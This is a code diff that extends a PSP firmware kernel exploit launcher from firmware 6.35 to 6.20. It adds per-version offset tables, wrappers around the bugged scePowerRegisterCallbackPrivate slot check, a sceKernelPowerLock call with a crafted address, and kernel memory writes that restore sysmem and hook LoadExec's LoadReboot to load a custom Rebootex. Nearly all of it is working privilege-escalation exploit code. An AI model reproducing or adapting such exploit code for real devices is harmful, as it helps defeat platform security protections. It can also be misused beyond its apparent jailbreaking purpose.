@@ -18,8 +18,19 @@
 
 #include "installer.h"
 #include "Rebootex_prx.h"
+#include "launcher_patch_offset.h"
 
-PSP_MODULE_INFO("635kernel", PSP_MODULE_USER, 1, 0);
+#define FW_635 0x06030510
+#define FW_620 0x06020010
+
+#define INTR(intr) \
+	_sw((intr), address); address +=4;
+#define INTR_HIGH(intr) \
+	_sw((intr&0xFFFF0000) + ((((intr) + (data_address >> 16)) & 0xFFFF)), address); address +=4;
+#define INTR_LOW(intr) \
+	_sw((intr&0xFFFF0000) + (((intr) + (data_address & 0xFFFF)) & 0xFFFF), address); address +=4;
+
+PSP_MODULE_INFO("PXELauncher", PSP_MODULE_USER, 1, 0);
 PSP_HEAP_SIZE_KB(128);
 
 //installer path
@@ -28,18 +39,53 @@ char installerpath[256];
 //psp model
 int model = 0;
 
-u32 fw_version = 0;
+u32 psp_fw_version = 0;
 
 int dump_kmem = 0;
 
 //load reboot function
 int (* LoadReboot)(void * arg1, unsigned int arg2, void * arg3, unsigned int arg4) = NULL;
 
+int scePowerRegisterCallbackPrivate_635(unsigned int slot, int cbid);
+int scePowerUnregisterCallbackPrivate_635(unsigned int slot);
+int scePowerRegisterCallbackPrivate_620(unsigned int slot, int cbid);
+int scePowerUnregisterCallbackPrivate_620(unsigned int slot);
+
 //register callback function - slot bugged. :D
-int scePowerRegisterCallbackPrivate(unsigned int slot, int cbid);
+int scePowerRegisterCallbackPrivate(unsigned int slot, int cbid)
+{
+	int ret = -1;
+
+	switch(psp_fw_version) {
+		case FW_635:
+			ret = scePowerRegisterCallbackPrivate_635(slot, cbid);
+			break;
+		case FW_620:
+			ret = scePowerRegisterCallbackPrivate_620(slot, cbid);
+			break;
+	}
+
+	return ret;
+}
 
 //unregister callback function - its slotcheck is bugged too. ;)
-int scePowerUnregisterCallbackPrivate(unsigned int slot);
+int scePowerUnregisterCallbackPrivate(unsigned int slot)
+{
+	int ret = -1;
+
+	switch(psp_fw_version) {
+		case FW_635:
+			ret = scePowerUnregisterCallbackPrivate_635(slot);
+			break;
+		case FW_620:
+			ret = scePowerUnregisterCallbackPrivate_620(slot);
+			break;
+	}
+
+	return ret;
+}
+
+extern int sceKernelPowerLock(unsigned int, unsigned int);
 
 u8 decompress_buf[1024*1024L];
 
@@ -59,7 +105,7 @@ int _LoadReboot(void * arg1, unsigned int arg2, void * arg3, unsigned int arg4)
 	_sw(size_rebootex, 0x88FB0004);
 
 	//store fw version
-	_sw(fw_version, 0x88FB0008);
+	_sw(psp_fw_version, 0x88FB0008);
 
 	//copy installer path
 	memcpy((char *)0x88FB0100, installerpath, sizeof(installerpath));
@@ -72,20 +118,12 @@ int _LoadReboot(void * arg1, unsigned int arg2, void * arg3, unsigned int arg4)
 int kernelSyscall(void);
 u32 get_power_address(int cbid);
 
-// restore offset 0x00009650~0x00009730 in sysmem
-void restore_sysmem(void)
+void restore_sysmem_635(void)
 {
 	u32 address, data_address;
 
-	address = 0x88000000 + 0x0000A110;
+	address = 0x88000000 + g_offs->patchRangeStart;
 	data_address = 0x88013B40;
-
-#define INTR(intr) \
-	_sw((intr), address); address +=4;
-#define INTR_HIGH(intr) \
-	_sw((intr&0xFFFF0000) + ((((intr) + (data_address >> 16)) & 0xFFFF)), address); address +=4;
-#define INTR_LOW(intr) \
-	_sw((intr&0xFFFF0000) + (((intr) + (data_address & 0xFFFF)) & 0xFFFF), address); address +=4;
 
 	// SysMemForKernel_E82F9E1B:
 	INTR_HIGH(0x3C050000);
@@ -156,66 +194,68 @@ void restore_sysmem(void)
 	INTR(0x00E01021);
 	INTR(0x03E00008);
 	INTR(0x27BD0010);
+}
 
-#undef INTR
-#undef HIGH
-#undef LOW
+void restore_sysmem_620(void)
+{
+	u32 address;
+
+	address = 0x88000000 + g_offs->patchRangeStart;
+
+	INTR(0xACC24230); /* sw v0, 0x4230(a2) */
+	INTR(0x0A003322); /* j 0x0800CC88 */
+	INTR(0x00001021); /* addu $v0, $zr, $zr */
+	INTR(0x3C058801); /* lui $a1, 0x8801 */
 }
 
 //our 6.35 kernel permission call
 int kernel_permission_call(void)
 {
-	//cache invalidation functions
-	void (* _sceKernelIcacheInvalidateAll)(void) = (void *)0x88000E98;
-	void (* _sceKernelDcacheWritebackInvalidateAll)(void) = (void *)0x88000744;
+	struct sceLoadExecPatch *patch;
 
-	restore_sysmem();
+	//cache invalidation functions
+	void (* _sceKernelIcacheInvalidateAll)(void) = (void *)g_offs->sceKernelIcacheInvalidateAll;
+	void (* _sceKernelDcacheWritebackInvalidateAll)(void) = (void *)g_offs->sceKernelDcacheWritebackInvalidateAll;
+
+	if(psp_fw_version == FW_635)
+		restore_sysmem_635();
+	else if(psp_fw_version == FW_620)
+		restore_sysmem_620();
 
 	//sync cache
 	_sceKernelIcacheInvalidateAll();
 	_sceKernelDcacheWritebackInvalidateAll();
 
 	//LoadCoreForKernel_EF8A0BEA
-	SceModule2 * (* _sceKernelFindModuleByName)(const char * libname) = (void *)0x88017000 + 0x000072D8;
+	SceModule2 * (* _sceKernelFindModuleByName)(const char * libname) = (void *)g_offs->sceKernelFindModuleByName;
 
 	//find LoadExec module
 	SceModule2 * loadexec = _sceKernelFindModuleByName("sceLoadExec");
 
 	//SysMemForKernel_458A70B5
-	int (* _sceKernelGetModel)(void) = (void *)0x88000000 + 0x0000A13C;
+	int (* _sceKernelGetModel)(void) = (void *)g_offs->sceKernelGetModel;
 
 	//save psp model
 	model = _sceKernelGetModel();
 
-	//loadexec patches
-	unsigned int offsets[2];
-
-	//psp N1000
-	if(model == 4)
-	{
-		offsets[0] = 0x00002F90;
-		offsets[1] = 0x00002FDC;
-	}
-
-	//psp 1000-4000
-	else
-	{
-		offsets[0] = 0x00002D44;
-		offsets[1] = 0x00002D90;
+	if(model == PSP_GO) {
+		patch = &g_offs->loadexec_patch_05g;
+	} else {
+		patch = &g_offs->loadexec_patch_other;
 	}
 
 	//replace LoadReboot function
-	_sw(MAKE_CALL(_LoadReboot), loadexec->text_addr + offsets[0]);
+	_sw(MAKE_CALL(_LoadReboot), loadexec->text_addr + patch->LoadRebootCall);
 
 	//patch Rebootex position to 0x88FC0000
-	_sw(0x3C0188FC, loadexec->text_addr + offsets[1]); // lui $at, 0x88FC
+	_sw(0x3C0188FC, loadexec->text_addr + patch->RebootAddress); // lui $at, 0x88FC
 
 	//sync cache
 	_sceKernelIcacheInvalidateAll();
 	_sceKernelDcacheWritebackInvalidateAll();
 
 	//save LoadReboot function
-	LoadReboot = (void*)loadexec->text_addr;
+	LoadReboot = (void*)loadexec->text_addr + patch->LoadReboot;
 
 	if (dump_kmem) {
 		memcpy((void*)0x08A00000, (void*)0x88000000, 0x400000);
@@ -448,6 +488,16 @@ int main(int argc, char * argv[])
 
 	pspDebugScreenInit();
 
+	psp_fw_version = sceKernelDevkitVersion();
+
+	if (psp_fw_version != FW_635 && psp_fw_version != FW_620) {
+		pspDebugScreenPrintf("Sorry. This program requires 6.20/6.35.\n");
+		sceKernelDelayThread(5*1000000);
+		goto exit;
+	}
+
+	setup_patch_offset_table(psp_fw_version);
+	
 	//puzzle installer path
 	strcpy(installerpath, argv[0]);
 
@@ -463,14 +513,6 @@ int main(int argc, char * argv[])
 	printk_init("ms0:/launcher.txt");
 	printk("Hello exploit\r\n");
 
-	fw_version = sceKernelDevkitVersion();
-
-	if (fw_version != 0x06030510) {
-		pspDebugScreenPrintf("Sorry. This program requires 6.35.\n");
-		sceKernelDelayThread(5*1000000);
-		goto exit;
-	}
-
 	if(sctrlHENGetVersion() >= 0) {
 		install_in_cfw();
 
@@ -479,10 +521,14 @@ int main(int argc, char * argv[])
 
 	input_dump_kmem();
 
-	//create a fitting one
-	while(!is_intr_OK((u32)cbid))
-	{
-		//sceKernelDeleteCallback(cbid);
+	if(psp_fw_version == FW_635) {
+		//create a fitting one
+		while(!is_intr_OK((u32)cbid))
+		{
+			//sceKernelDeleteCallback(cbid);
+			cbid = sceKernelCreateCallback("", NULL, NULL);
+		}
+	} else if (psp_fw_version == FW_620) {
 		cbid = sceKernelCreateCallback("", NULL, NULL);
 	}
 
@@ -494,12 +540,12 @@ int main(int argc, char * argv[])
 	scePowerUnregisterCallbackPrivate(0);
 	printk("power_buf_address 0x%08X\r\n", power_buf_address);
 
-	if(!is_pspgo()) {
+	if(psp_fw_version == FW_635 && !is_pspgo()) {
 		patch_power_arg(cbid, power_buf_address);
 	}
 
 	//override sysmem function
-	unsigned int smpos = 0x0000A110; for(; smpos < 0x0000A1F0; smpos += 16)
+	unsigned int smpos = g_offs->patchRangeStart; for(; smpos < g_offs->patchRangeEnd; smpos += 16)
 	{
 		//calculate slot
 		unsigned int slot = get_power_slot_by_address(((u32)0x88000000)+smpos, power_buf_address);
@@ -519,7 +565,16 @@ int main(int argc, char * argv[])
 
 	//restoring instructions and patching loadexec
 	unsigned int interrupts = pspSdkDisableInterrupts();
-	result = SysMemUserForUser_D8DE5C1E(0xC01DB15D, 0xC00DCAFE, kernelSyscall, 0x12345678, -1);
+
+	if(psp_fw_version == FW_635) {
+		result = SysMemUserForUser_D8DE5C1E(0xC01DB15D, 0xC00DCAFE, kernelSyscall, 0x12345678, -1);
+	} else if (psp_fw_version == FW_620) {
+		u32 entry_addr;
+
+		entry_addr = ((u32) &kernel_permission_call) - 16;
+		result = sceKernelPowerLock(0, ((u32) &entry_addr) - 0x4234);
+	}
+
 	pspSdkEnableInterrupts(interrupts);
 
 	if ( dump_kmem ) {
